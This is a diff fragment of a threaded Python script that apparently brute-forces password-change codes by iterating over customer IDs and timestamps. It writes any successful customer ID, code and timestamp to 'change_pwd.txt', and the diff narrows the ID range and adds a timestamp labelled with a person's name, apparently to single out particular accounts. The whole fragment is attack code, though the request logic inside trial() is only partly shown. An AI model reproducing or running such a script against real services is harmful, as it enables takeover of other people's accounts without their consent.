@@ -3,7 +3,7 @@ import threading
 import time
 s = requests.Session()
 timestamp = 1468087193 # 玉帝
-
+timestamp = 1468191943 # 张三丰 
 
 headers = {
 "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
@@ -28,6 +28,7 @@ def trial(customer_id, timestamp):
                     f = open( "change_pwd.txt", "w" )
                     f.write( "{}\n{}\n{}".format( customer_id, code, timestamp ) )
                     f.close()
+                    exit()
                 else:
                     print(url)
                 break
@@ -35,9 +36,9 @@ def trial(customer_id, timestamp):
                 print( "Warning:{}".format(e) )
 
 for timestamp in range( 1468087193, 1468087195 ):
-    for customer_id in range(1000, 1200,200):
+    for customer_id in range(1100, 1162,62):
         t_list = list()
-        for i in range( customer_id, customer_id + 200):
+        for i in range( customer_id, customer_id + 62):
             t = threading.Thread( target = trial, args = ( i, timestamp ) )
             print( i, timestamp )
             t_list.append( t )
